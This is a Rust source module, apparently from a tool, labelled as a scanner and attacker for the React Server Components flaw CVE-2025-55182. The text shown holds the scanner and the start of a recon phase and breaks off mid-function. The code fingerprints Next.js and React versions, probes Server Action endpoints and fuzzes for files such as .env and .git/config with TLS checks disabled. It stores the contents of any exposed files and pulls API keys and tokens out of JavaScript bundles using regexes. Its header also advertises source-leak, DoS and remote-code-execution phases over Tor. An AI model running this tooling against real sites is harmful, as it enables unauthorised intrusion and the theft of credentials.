//! # React2Shell — CVE-2025-55182 Scanner, Attacker & Report Generator
//!
//! **Enterprise-grade React Server Components vulnerability toolkit.**
//!
//! This module provides a complete Rust implementation of the React2Shell toolchain:
//!
//! ## Scanner
//! - Static JS bundle analysis (React & Next.js version detection)
//! - RSC/Server Action endpoint discovery
//! - HTTP header analysis for framework fingerprinting
//! - Sensitive file fuzzing (`.env`, `.git/config`, etc.)
//! - Secret/API key pattern detection in JS bundles
//! - Vulnerability evaluation against known-vulnerable version lists
//!
//! ## Attacker
//! - **Phase 1 — Reconnaissance**: Technology stack fingerprinting & version extraction
//! - **Phase 2 — Source Leak** (CVE-2025-55183): Flight protocol source code exfiltration
//! - **Phase 3 — DoS** (CVE-2025-55184): Memory/CPU exhaustion via self-referencing payloads
//! - **Phase 4 — RCE** (CVE-2025-55182): Remote code execution via blob handler exploitation
//! - **Phase 5 — Full Chain**: Orchestrated multi-phase attack with optional Tor proxying
//!
//! ## Report Generator
//! - Structured JSON reports for all scan/attack phases
//! - Colored console output with severity indicators
//! - Aggregate attack report combining all phases

use crate::error::{Result, WebAnalyzerError};
use chrono::Utc;
use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::time::{Duration, Instant};

// ═════════════════════════════════════════════════════════════════════════════
// Result Types
// ═════════════════════════════════════════════════════════════════════════════

/// Version information detected from a source.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VersionInfo {
    pub version: String,
    pub source: String,
    pub context: String,
}

/// A discovered software dependency with version.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DependencyInfo {
    pub name: String,
    pub version: String,
    pub source: String,
    pub context: String,
}

/// A detected secret/credential.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecretInfo {
    pub secret_type: String,
    pub value: String,
    pub source: String,
    pub context: String,
}

/// An exposed sensitive file discovered during fuzzing.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExposedFile {
    pub path: String,
    pub url: String,
    pub context: String,
}

/// Full results from a React2Shell vulnerability scan.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub url: String,
    pub is_nextjs: bool,
    pub nextjs_version: Option<VersionInfo>,
    pub react_version: Option<VersionInfo>,
    pub rsc_enabled: bool,
    pub vulnerable: bool,
    pub dependencies: Vec<DependencyInfo>,
    pub exposed_files: Vec<ExposedFile>,
    pub secrets: Vec<SecretInfo>,
    pub details: Vec<String>,
    pub scan_duration_ms: u64,
}

/// Reconnaissance phase result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReconResult {
    pub target: String,
    pub timestamp: String,
    pub nextjs_version: Option<String>,
    pub react_version: Option<String>,
    pub is_app_router: bool,
    pub rsc_endpoints: Vec<RscEndpoint>,
    pub vulnerable: bool,
}

/// A discovered RSC/Server Action endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RscEndpoint {
    pub path: String,
    pub method: String,
    pub content_type: String,
    pub notes: String,
}

/// A finding from source code leak analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourceLeakFinding {
    pub pattern: String,
    pub matched: String,
    pub context: String,
}

/// Source leak attack result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourceLeakResult {
    pub target: String,
    pub success: bool,
    pub bytes_leaked: usize,
    pub leaked_source: String,
    pub findings: Vec<SourceLeakFinding>,
}

/// DoS test result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DosResult {
    pub target: String,
    pub baseline_ms: f64,
    pub attack_elapsed_ms: f64,
    pub dos_successful: bool,
    pub server_recovered: bool,
    pub effect_multiplier: f64,
}

/// RCE execution result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RceResult {
    pub target: String,
    pub success: bool,
    pub poc_file_created: bool,
    pub command_outputs: Vec<RceCommandOutput>,
}

/// Output from a single RCE command execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RceCommandOutput {
    pub command: String,
    pub output: String,
    pub exit_code: i32,
    pub error: String,
}

/// Result of a single attack phase.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackPhaseResult {
    pub phase: String,
    pub success: bool,
    pub duration_ms: u64,
    pub details: String,
}

/// Combined full-chain attack result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FullChainResult {
    pub target: String,
    pub timestamp: String,
    pub phases: Vec<AttackPhaseResult>,
    pub total_duration_ms: u64,
    pub tor_enabled: bool,
    pub scan: Option<ScanResult>,
    pub recon: Option<ReconResult>,
    pub source_leak: Option<SourceLeakResult>,
    pub dos: Option<DosResult>,
    pub rce: Option<RceResult>,
}

/// Aggregate attack report combining scan + attack results.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackReport {
    pub target: String,
    pub generated_at: String,
    pub scan: Option<ScanResult>,
    pub recon: Option<ReconResult>,
    pub source_leak: Option<SourceLeakResult>,
    pub dos: Option<DosResult>,
    pub rce: Option<RceResult>,
    pub full_chain: Option<FullChainResult>,
    pub summary: ReportSummary,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReportSummary {
    pub rsc_active: bool,
    pub framework_detected: bool,
    pub version_found: bool,
    pub vulnerability_verdict: String,
    pub attack_phases_completed: Vec<String>,
    pub risk_level: String,
}

// ═════════════════════════════════════════════════════════════════════════════
// Constants
// ═════════════════════════════════════════════════════════════════════════════

/// Known vulnerable React versions (CVE-2025-55182).
const VULNERABLE_REACT: &[&str] = &[
    "19.0.0", "19.1.0", "19.1.1", "19.2.0", "18.3.0-canary",
];

/// Known vulnerable Next.js versions (CVE-2025-55182).
const VULNERABLE_NEXT: &[&str] = &[
    "14.3.0-canary",
    "15.0.0", "15.0.1", "15.0.2", "15.0.3", "15.0.4",
    "15.1.0", "15.1.1", "15.1.2", "15.1.3", "15.1.4",
    "15.1.5", "15.1.6", "15.1.7", "15.1.8",
    "15.2.0", "15.2.1", "15.2.2", "15.2.3", "15.2.4", "15.2.5",
    "15.3.0", "15.3.1", "15.3.2", "15.3.3", "15.3.4", "15.3.5",
    "15.4.0", "15.4.1", "15.4.2", "15.4.3", "15.4.4",
    "15.4.5", "15.4.6", "15.4.7",
    "15.5.0", "15.5.1", "15.5.2", "15.5.3", "15.5.4",
    "15.5.5", "15.5.6",
    "16.0.0", "16.0.1", "16.0.2", "16.0.3", "16.0.4",
    "16.0.5", "16.0.6",
];

/// Sensitive file paths to fuzz.
const SENSITIVE_PATHS: &[&str] = &[
    ".env", ".env.local", ".env.development", ".env.production", ".env.test",
    ".git/config", ".git/HEAD", "package.json", "package-lock.json",
    "docker-compose.yml", "Dockerfile", ".npmrc", "yarn.lock",
    "next.config.js", "tsconfig.json", ".vscode/settings.json",
    "web.config", "robots.txt",
];

/// Secret detection patterns: (name, regex).
const SECRET_PATTERNS: &[(&str, &str)] = &[
    ("Google API Key", r"AIza[0-9A-Za-z\-_]{35}"),
    ("Firebase URL", r"https://[a-z0-9\-]+\.firebaseio\.com"),
    ("Slack Webhook", r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+"),
    ("AWS Access Key", r"AKIA[0-9A-Z]{16}"),
    ("AWS Secret Key", r"secret_?key\s*[:=]\s*['\"][0-9a-zA-Z/+]{40}['\"]"),
    ("JWT Token", r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*"),
    ("GitHub Token", r"gh[oprs]_[a-zA-Z0-9]{36,}"),
    ("Discord Webhook", r"https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9\-]+"),
    ("Generic API Key", r"(?:api_?key|auth_?token|access_?token)\s*[:=]\s*['\"][0-9a-zA-Z\-_]{16,}['\"]"),
];

/// Sensitive data extraction patterns for source leak analysis.
const SOURCE_LEAK_PATTERNS: &[&str] = &[
    r"(?i)(api[_-]?key|api[_-]?secret)",
    r"(?i)(db[_-]?password|database[_-]?url)",
    r"(?i)(jwt[_-]?secret|signing[_-]?key)",
    r"(?i)(token|bearer|auth)",
    r"(?i)(postgresql://|mysql://|mongodb://)",
    r"(?i)(sk_live|pk_live|sk_test)",
];

/// JavaScript file priority keywords (files matching these are scanned first).
const JS_PRIORITY_KEYWORDS: &[&str] = &[
    "framework", "main", "webpack", "app", "pages", "layout",
];

// ═════════════════════════════════════════════════════════════════════════════
// ANSI Color Helpers
// ═════════════════════════════════════════════════════════════════════════════

struct Color;

impl Color {
    const RED: &'static str = "\x1b[91m";
    const GREEN: &'static str = "\x1b[92m";
    const YELLOW: &'static str = "\x1b[93m";
    const BLUE: &'static str = "\x1b[94m";
    const MAGENTA: &'static str = "\x1b[95m";
    const CYAN: &'static str = "\x1b[96m";
    const WHITE: &'static str = "\x1b[97m";
    const BOLD: &'static str = "\x1b[1m";
    const DIM: &'static str = "\x1b[2m";
    const RESET: &'static str = "\x1b[0m";
    const BG_RED: &'static str = "\x1b[41m";
    const BG_GREEN: &'static str = "\x1b[42m";
}

// ═════════════════════════════════════════════════════════════════════════════
// Utility Functions
// ═════════════════════════════════════════════════════════════════════════════

/// Check if a React version is in the known-vulnerable list.
pub fn is_react_vulnerable(version: &str) -> bool {
    VULNERABLE_REACT.iter().any(|v| version.starts_with(v))
}

/// Check if a Next.js version is in the known-vulnerable list.
pub fn is_nextjs_vulnerable(version: &str) -> bool {
    VULNERABLE_NEXT.iter().any(|v| version.starts_with(v))
}

/// Build a reqwest Client that skips TLS verification (pentesting mode).
fn build_insecure_client() -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent("React2Shell-Scanner/2.0 (Rust/Pentest)")
        .timeout(Duration::from_secs(15))
        .build()
        .map_err(|e| WebAnalyzerError::Http(e))
}

/// Build a reqwest Client with a custom timeout.
fn build_client_with_timeout(secs: u64) -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent("React2Shell-Scanner/2.0 (Rust/Pentest)")
        .timeout(Duration::from_secs(secs))
        .build()
        .map_err(|e| WebAnalyzerError::Http(e))
}

/// Return a context window around a match position in a string.
fn context_window(text: &str, start: usize, end: usize, window: usize) -> String {
    let s = if start > window { start - window } else { 0 };
    let e = std::cmp::min(text.len(), end + window);
    text[s..e].to_string()
}

// ═════════════════════════════════════════════════════════════════════════════
// Scanner
// ═════════════════════════════════════════════════════════════════════════════

/// React2Shell vulnerability scanner for detecting CVE-2025-55182.
///
/// Performs header analysis, JS bundle fingerprinting, RSC endpoint detection,
/// sensitive file fuzzing, and secret extraction.
pub struct React2ShellScanner {
    target: String,
    client: Client,
    results: ScanResult,
}

impl React2ShellScanner {
    /// Create a new scanner for the given target URL.
    pub async fn new(target: &str) -> Result<Self> {
        let target = target.trim_end_matches('/').to_string();
        Ok(Self {
            target: target.clone(),
            client: build_insecure_client()?,
            results: ScanResult {
                url: target,
                is_nextjs: false,
                nextjs_version: None,
                react_version: None,
                rsc_enabled: false,
                vulnerable: false,
                dependencies: Vec::new(),
                exposed_files: Vec::new(),
                secrets: Vec::new(),
                details: Vec::new(),
                scan_duration_ms: 0,
            },
        })
    }

    fn add_detail(&mut self, detail: &str) {
        self.results.details.push(detail.to_string());
    }

    // ── Header Analysis ──────────────────────────────────────────────────

    /// Analyze HTTP response headers for Next.js/React indicators.
    pub async fn analyze_headers(&mut self) -> Result<()> {
        let resp = match self.client.head(&self.target).send().await {
            Ok(r) => r,
            Err(_) => {
                self.add_detail("Header analysis: HEAD request failed, trying GET.");
                self.client.get(&self.target).send().await.map_err(|e| {
                    WebAnalyzerError::Http(e)
                })?
            }
        };

        let headers = resp.headers();
        let x_powered_by = headers
            .get("x-powered-by")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_lowercase();

        if x_powered_by.contains("next.js") {
            self.results.is_nextjs = true;
            self.add_detail("Header 'X-Powered-By' indicates Next.js.");

            // Try to extract version from the header value
            if let Ok(re) = Regex::new(r"next\.js\s*([\d\.]+)") {
                if let Some(caps) = re.captures(&x_powered_by) {
                    let ver = caps.get(1).unwrap().as_str().to_string();
                    self.results.nextjs_version = Some(VersionInfo {
                        version: ver.clone(),
                        source: self.target.clone(),
                        context: format!("x-powered-by: {}", x_powered_by),
                    });
                    self.add_detail(&format!(
                        "Next.js version detected from headers: {}",
                        ver
                    ));
                }
            }
        }

        // Check for X-NextJS-* custom headers
        let has_nextjs_headers = headers
            .keys()
            .any(|k| k.as_str().to_lowercase().starts_with("x-nextjs"));
        if has_nextjs_headers {
            self.results.is_nextjs = true;
            self.add_detail("Custom 'X-NextJS-*' headers detected.");
        }

        // Check for Next.js-specific cookies
        if let Some(cookie) = headers.get("set-cookie").and_then(|v| v.to_str().ok()) {
            if cookie.contains("__prerender_bypass") {
                self.results.is_nextjs = true;
                self.add_detail("Next.js prerender bypass cookie detected.");
            }
        }
        if headers.contains_key("x-invoke-path") {
            self.results.is_nextjs = true;
            self.add_detail("Next.js 'x-invoke-path' header detected.");
        }

        Ok(())
    }

    // ── Static Bundle Analysis ───────────────────────────────────────────

    /// Fetch the target HTML and analyze embedded JS bundles for versions.
    pub async fn fetch_static_bundles(&mut self) -> Result<()> {
        let resp = self.client.get(&self.target).send().await.map_err(|e| {
            WebAnalyzerError::Http(e)
        })?;

        let html = resp.text().await.map_err(|e| {
            WebAnalyzerError::Other(format!("Failed to read response body: {}", e))
        })?;

        // Check generator meta tag for Next.js
        if let Ok(re) = Regex::new(
            r#"<meta[^>]+name=["']generator["'][^>]+content=["']Next\.js\s+(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#,
        ) {
            if let Some(caps) = re.captures(&html) {
                let ver = caps.get(1).unwrap().as_str().to_string();
                if self.results.nextjs_version.is_none() {
                    let ctx = context_window(&html, caps.get(0).unwrap().start(), caps.get(0).unwrap().end(), 30);
                    self.results.nextjs_version = Some(VersionInfo {
                        version: ver.clone(),
                        source: self.target.clone(),
                        context: ctx,
                    });
                    self.results.is_nextjs = true;
                    self.add_detail(&format!(
                        "Next.js version detected from HTML meta tag: {}",
                        ver
                    ));
                }
            }
        }

        // Check for Next.js App Router (RSC-enabled)
        if html.contains("_next/static/chunks/app/")
            || html.contains("app-pages-internals")
            || html.contains("self.__next_f")
        {
            self.results.is_nextjs = true;
            self.results.rsc_enabled = true;
            self.add_detail("Next.js App Router detected (RSC active).");
        } else if html.contains("id=\"__NEXT_DATA__\"") || html.contains("_next/static") {
            self.results.is_nextjs = true;
            self.add_detail("Next.js Pages Router or static file structure detected.");
        }

        // Verify with build-manifest.json if still uncertain
        if !self.results.is_nextjs {
            let manifest_url = format!("{}/_next/build-manifest.json", self.target);
            if let Ok(resp) = self.client.get(&manifest_url).send().await {
                if resp.status().is_success() {
                    if let Ok(body) = resp.text().await {
                        if body.contains("pages") {
                            self.results.is_nextjs = true;
                            self.add_detail(
                                "/_next/build-manifest.json accessible — confirmed Next.js.",
                            );
                        }
                    }
                }
            }
        }

        // Extract JS file paths from HTML
        let js_pattern = Regex::new(r"(/_next/static/[a-zA-Z0-9_/\-\.]+\.js)").unwrap();
        let js_files: HashSet<String> = js_pattern
            .find_iter(&html)
            .map(|m| m.as_str().to_string())
            .collect();

        if !js_files.is_empty() {
            self.add_detail(&format!(
                "Found {} static JS files. Starting version analysis...",
                js_files.len()
            ));
            self.extract_versions_from_js(js_files).await;
        }

        Ok(())
    }

    /// Download JS bundles and extract version information.
    async fn extract_versions_from_js(&mut self, initial_js_files: HashSet<String>) {
        let mut scanned: HashSet<String> = HashSet::new();
        let mut to_scan: Vec<String> = initial_js_files.into_iter().collect();

        // Sort by priority keywords
        to_scan.sort_by(|a, b| {
            let a_prio = JS_PRIORITY_KEYWORDS.iter().any(|k| a.contains(k));
            let b_prio = JS_PRIORITY_KEYWORDS.iter().any(|k| b.contains(k));
            b_prio.cmp(&a_prio)
        });

        let max_files = 100usize;

        while let Some(js_path) = to_scan.pop() {
            if scanned.contains(&js_path) || scanned.len() >= max_files {
                continue;
            }
            scanned.insert(js_path.clone());

            let js_url = if js_path.starts_with("http") {
                js_path.clone()
            } else {
                format!("{}{}", self.target, js_path)
            };

            let js_content = match self.client.get(&js_url).send().await {
                Ok(resp) if resp.status().is_success() => match resp.text().await {
                    Ok(t) => t,
                    Err(_) => continue,
                },
                _ => continue,
            };

            // Discover new chunk references
            let new_js_re = Regex::new(r#"["'](/[a-zA-Z0-9_/\-\.]+\.js)["']"#).unwrap();
            let chunk_re = Regex::new(r"static/chunks/[a-zA-Z0-9_/\-\.]+\.js").unwrap();

            for m in new_js_re.find_iter(&js_content) {
                let path = m.as_str().trim_matches(&['"', '\''][..]).to_string();
                if !scanned.contains(&path) && !to_scan.contains(&path) {
                    to_scan.push(path);
                }
            }
            for m in chunk_re.find_iter(&js_content) {
                let path = format!("/_next/{}", m.as_str());
                if !scanned.contains(&path) && !to_scan.contains(&path) {
                    to_scan.push(path);
                }
            }

            // Re-sort after adding new files
            to_scan.sort_by(|a, b| {
                let a_prio = JS_PRIORITY_KEYWORDS.iter().any(|k| a.contains(k));
                let b_prio = JS_PRIORITY_KEYWORDS.iter().any(|k| b.contains(k));
                b_prio.cmp(&a_prio)
            });

            // Extract package versions via /*! ... */ banner comments
            let pkg_re = Regex::new(
                r"/\*!\s*(?:[A-Za-z0-9_\-\.\@\/]+\s+)?([a-zA-Z0-9_\-\.\@\/]+)\s+[vV]?([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)\s*\*/",
            )
            .unwrap();

            for caps in pkg_re.captures_iter(&js_content) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let version = caps.get(2).unwrap().as_str().to_string();
                if !self.results.dependencies.iter().any(|d| d.name == name) {
                    let ctx = context_window(
                        &js_content,
                        caps.get(0).unwrap().start(),
                        caps.get(0).unwrap().end(),
                        30,
                    );
                    self.results.dependencies.push(DependencyInfo {
                        name: name.clone(),
                        version: version.clone(),
                        source: js_url.clone(),
                        context: ctx,
                    });
                    self.add_detail(&format!("Dependency detected: {} (v{})", name, version));
                }
            }

            // Extract embedded package.json-style definitions
            let embedded_re = Regex::new(
                r#"(?:name|pkg|package)\s*:\s*["']([a-zA-Z0-9_\-\.\@\/]+)["']\s*,\s*(?:version|ver)\s*:\s*["']([0-9]+\.[0-9]+\.[0-9]+[a-zA-Z0-9_\-\.]*)["']"#,
            )
            .unwrap();

            for caps in embedded_re.captures_iter(&js_content) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let version = caps.get(2).unwrap().as_str().to_string();
                if name.len() > 1 && version.len() > 1
                    && !self.results.dependencies.iter().any(|d| d.name == name)
                {
                    let ctx = context_window(
                        &js_content,
                        caps.get(0).unwrap().start(),
                        caps.get(0).unwrap().end(),
                        30,
                    );
                    self.results.dependencies.push(DependencyInfo {
                        name: name.clone(),
                        version: version.clone(),
                        source: js_url.clone(),
                        context: ctx,
                    });
                    self.add_detail(&format!(
                        "Embedded dependency detected: {} (v{})",
                        name, version
                    ));
                }
            }

            // Look for React version
            if self.results.react_version.is_none() {
                self.try_extract_react_version(&js_content, &js_url);
            }

            // Look for Next.js version
            if self.results.nextjs_version.is_none() {
                self.try_extract_nextjs_version(&js_content, &js_url);
            }

            // Scan for secrets
            self.detect_secrets(&js_content, &js_url);
        }

        // Fallback: try /api/health endpoint
        if self.results.react_version.is_none() || self.results.nextjs_version.is_none() {
            let health_url = format!("{}/api/health", self.target);
            if let Ok(resp) = self.client.get(&health_url).send().await {
                if resp.status().is_success() {
                    if let Ok(data) = resp.json::<serde_json::Value>().await {
                        if let Some(versions) = data.get("version") {
                            if self.results.react_version.is_none() {
                                if let Some(react_ver) = versions.get("react").and_then(|v| v.as_str()) {
                                    self.results.react_version = Some(VersionInfo {
                                        version: react_ver.to_string(),
                                        source: health_url.clone(),
                                        context: data.to_string(),
                                    });
                                    self.add_detail(&format!(
                                        "/api/health revealed React version: {}",
                                        react_ver
                                    ));
                                }
                            }
                            if self.results.nextjs_version.is_none() {
                                if let Some(next_ver) = versions.get("next").and_then(|v| v.as_str()) {
                                    self.results.nextjs_version = Some(VersionInfo {
                                        version: next_ver.to_string(),
                                        source: health_url.clone(),
                                        context: data.to_string(),
                                    });
                                    self.add_detail(&format!(
                                        "/api/health revealed Next.js version: {}",
                                        next_ver
                                    ));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    fn try_extract_react_version(&mut self, js_content: &str, source_url: &str) {
        let patterns = [
            (r"react(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
            (r#"reconcilerVersion\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
            (r#"(?:version|ReactVersion)\s*[:=]\s*["'](1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
            (r#""react"\s*:\s*"[^"]*(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#, false),
            (r"react-dom(?:@|[\s\-\_]*v?)(1[89]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
        ];

        for (pattern, requires_react_context) in &patterns {
            if let Ok(re) = Regex::new(pattern) {
                if let Some(caps) = re.captures(js_content) {
                    let version = caps.get(1).unwrap().as_str().to_string();
                    if *requires_react_context {
                        let lower = js_content.to_lowercase();
                        if lower.contains("react")
                            || lower.contains("uselayouteffect")
                            || lower.contains("usestate")
                        {
                            let ctx = context_window(
                                js_content,
                                caps.get(0).unwrap().start(),
                                caps.get(0).unwrap().end(),
                                30,
                            );
                            self.results.react_version = Some(VersionInfo {
                                version: version.clone(),
                                source: source_url.to_string(),
                                context: ctx,
                            });
                            self.add_detail(&format!(
                                "React version detected in JS bundle: {}",
                                version
                            ));
                            return;
                        }
                    } else {
                        let ctx = context_window(
                            js_content,
                            caps.get(0).unwrap().start(),
                            caps.get(0).unwrap().end(),
                            30,
                        );
                        self.results.react_version = Some(VersionInfo {
                            version: version.clone(),
                            source: source_url.to_string(),
                            context: ctx,
                        });
                        self.add_detail(&format!(
                            "React version detected in JS bundle: {}",
                            version
                        ));
                        return;
                    }
                }
            }
        }
    }

    fn try_extract_nextjs_version(&mut self, js_content: &str, source_url: &str) {
        let patterns = [
            (r"next(?:@|[\s\-\_]*v?)(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)", false),
            (r#"window\.next\s*=\s*\{.*?version:\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, false),
            (r#"(?:__NEXT_VERSION|nextVersion|version)\s*[:=]\s*["'](1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)["']"#, true),
            (r#""next"\s*:\s*"[^"]*(1[456]\.[\d\.]+(?:-[a-zA-Z0-9.\-]+)?)[^"]*""#, false),
        ];

        for (pattern, requires_nextjs_context) in &patterns {
            if let Ok(re) = Regex::new(pattern) {
                if let Some(caps) = re.captures(js_content) {
                    let version = caps.get(1).unwrap().as_str().to_string();
                    if *requires_nextjs_context {
                        let lower = js_content.to_lowercase();
                        if lower.contains("next")
                            || lower.contains("app-router")
                            || lower.contains("window.next")
                        {
                            let ctx = context_window(
                                js_content,
                                caps.get(0).unwrap().start(),
                                caps.get(0).unwrap().end(),
                                30,
                            );
                            self.results.nextjs_version = Some(VersionInfo {
                                version: version.clone(),
                                source: source_url.to_string(),
                                context: ctx,
                            });
                            self.add_detail(&format!(
                                "Next.js version detected in JS bundle: {}",
                                version
                            ));
                            return;
                        }
                    } else {
                        let ctx = context_window(
                            js_content,
                            caps.get(0).unwrap().start(),
                            caps.get(0).unwrap().end(),
                            30,
                        );
                        self.results.nextjs_version = Some(VersionInfo {
                            version: version.clone(),
                            source: source_url.to_string(),
                            context: ctx,
                        });
                        self.add_detail(&format!(
                            "Next.js version detected in JS bundle: {}",
                            version
                        ));
                        return;
                    }
                }
            }
        }
    }

    // ── Secret Detection ─────────────────────────────────────────────────

    /// Scan content for secrets (API keys, tokens, etc.).
    fn detect_secrets(&mut self, content: &str, source_url: &str) {
        for (name, pattern) in SECRET_PATTERNS {
            if let Ok(re) = Regex::new(pattern) {
                for m in re.find_iter(content) {
                    let val = m.as_str().to_string();
                    if !self.results.secrets.iter().any(|s| s.value == val) {
                        let ctx = context_window(content, m.start(), m.end(), 30);
                        self.results.secrets.push(SecretInfo {
                            secret_type: name.to_string(),
                            value: val,
                            source: source_url.to_string(),
                            context: ctx,
                        });
                        self.add_detail(&format!(
                            "Secret detected: {} ({})",
                            name, source_url
                        ));
                    }
                }
            }
        }
    }

    // ── Flight Protocol Check ────────────────────────────────────────────

    /// Test whether the target supports RSC/Server Actions (Flight protocol).
    pub async fn check_flight_protocol(&mut self) -> Result<()> {
        let headers: Vec<(&str, &str)> = vec![
            ("RSC", "1"),
            ("Content-Type", "text/x-component"),
            ("Next-Action", "test-action"),
            (
                "Next-Router-State-Tree",
                "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            ),
        ];

        let mut req = self.client.post(&self.target).body("[]".to_string());
        for (k, v) in &headers {
            req = req.header(*k, *v);
        }

        match req.send().await {
            Ok(resp) => {
                let resp_headers = resp.headers().clone();
                let content_type = resp_headers
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_lowercase();

                if content_type.contains("text/x-component") {
                    self.results.rsc_enabled = true;
                    self.add_detail(
                        "Flight protocol active! Server supports RSC & Server Actions.",
                    );
                } else if [400u16, 500].contains(&resp.status().as_u16()) {
                    if let Ok(body) = resp.text().await {
                        let lower = body.to_lowercase();
                        if lower.contains("action") || lower.contains("flight") {
                            self.results.rsc_enabled = true;
                            self.add_detail(
                                "Flight protocol error received. RSC active but payload rejected.",
                            );
                        }
                    }
                }
            }
            Err(e) => {
                self.add_detail(&format!("Flight protocol test error: {}", e));
            }
        }

        Ok(())
    }

    // ── Sensitive File Fuzzing ───────────────────────────────────────────

    /// Fuzz for exposed sensitive files.
    pub async fn fuzz_sensitive_files(&mut self) -> Result<()> {
        self.add_detail("Starting sensitive file fuzzing...");
        self.results.exposed_files.clear();

        for path in SENSITIVE_PATHS {
            let url = format!("{}/{}", self.target, path.trim_start_matches('/'));
            match self.client.get(&url).send().await {
                Ok(resp) if resp.status().is_success() => {
                    let content_type = resp
                        .headers()
                        .get("content-type")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");
                    // Anti-false-positive: skip HTML pages
                    if content_type.contains("text/html") {
                        continue;
                    }
                    match resp.text().await {
                        Ok(body) => {
                            if body.len() < 100 || !body[..100].to_lowercase().contains("<html") {
                                let ctx = if body.len() > 200 {
                                    format!("{}...", &body[..200])
                                } else {
                                    body.clone()
                                };
                                self.results.exposed_files.push(ExposedFile {
                                    path: path.to_string(),
                                    url: url.clone(),
                                    context: ctx,
                                });
                                self.add_detail(&format!("Exposed sensitive file: {} ({})", path, url));
                            }
                        }
                        Err(_) => {}
                    }
                }
                _ => {}
            }
        }

        Ok(())
    }

    // ── Vulnerability Evaluation ─────────────────────────────────────────

    /// Evaluate whether the target is vulnerable to CVE-2025-55182.
    pub fn evaluate_vulnerability(&mut self) {
        let mut is_react_vuln = false;
        let mut is_next_vuln = false;

        if let Some(ref ver_info) = self.results.react_version {
            if is_react_vulnerable(&ver_info.version) {
                is_react_vuln = true;
                self.add_detail(&format!(
                    "React {} is in the vulnerable versions list!",
                    ver_info.version
                ));
            }
        }

        if let Some(ref ver_info) = self.results.nextjs_version {
            if is_nextjs_vulnerable(&ver_info.version) {
                is_next_vuln = true;
                self.add_detail(&format!(
                    "Next.js {} is in the vulnerable versions list!",
                    ver_info.version
                ));
            }
        }

        // Definite vulnerable: known version + RSC active
        if (is_react_vuln || is_next_vuln) && self.results.rsc_enabled {
            self.results.vulnerable = true;
        }
        // Likely vulnerable: known vulnerable version, even if RSC not confirmed
        else if is_react_vuln || is_next_vuln {
            self.add_detail("Vulnerable framework version used. RSC endpoint not confirmed but high risk.");
            self.results.vulnerable = true;
        }
        // Potential: Next.js confirmed, RSC active, but version unknown
        else if self.results.is_nextjs && self.results.rsc_enabled && self.results.nextjs_version.is_none() {
            self.add_detail("Version unknown but RSC active. Potentially vulnerable (Next.js 15+).");
            self.results.vulnerable = true;
        }
        // Unknown RSC state but version undetermined
        else if self.results.rsc_enabled
            && self.results.react_version.is_none()
            && self.results.nextjs_version.is_none()
        {
            self.add_detail("Versions not detected but RSC is active. Manual verification recommended.");
        }
    }

    // ── Run Full Scan ────────────────────────────────────────────────────

    /// Execute all scan phases and return the results.
    pub async fn scan(&mut self) -> Result<ScanResult> {
        let start = Instant::now();

        self.analyze_headers().await?;
        self.fetch_static_bundles().await?;
        self.check_flight_protocol().await?;
        self.fuzz_sensitive_files().await?;
        self.evaluate_vulnerability();

        self.results.scan_duration_ms = start.elapsed().as_millis() as u64;
        Ok(self.results.clone())
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacker — Reconnaissance Phase
// ═════════════════════════════════════════════════════════════════════════════

/// Reconnaissance attack — technology stack fingerprinting.
pub async fn run_recon(target: &str) -> Result<ReconResult> {
    let target = target.trim_end_matches('/').to_string();
    let client = build_insecure_client()?;

    let mut is_app_router = false;
    let mut nextjs_version: Option<String> = None;
    let mut react_version: Option<String> = None;
    let mut rsc_endpoints: Vec<RscEndpoint> = Vec::new();

    // Check /api/health first
    if let Ok(resp) = client.get(&format!("{}/api/health", target)).send().await {
        if resp.status().is_success() {
            if let Ok(data) = resp.json::<serde_json::Value>().await {
                if let Some(versions) = data.get("version") {
                    nextjs_version = versions
                        .get("next")
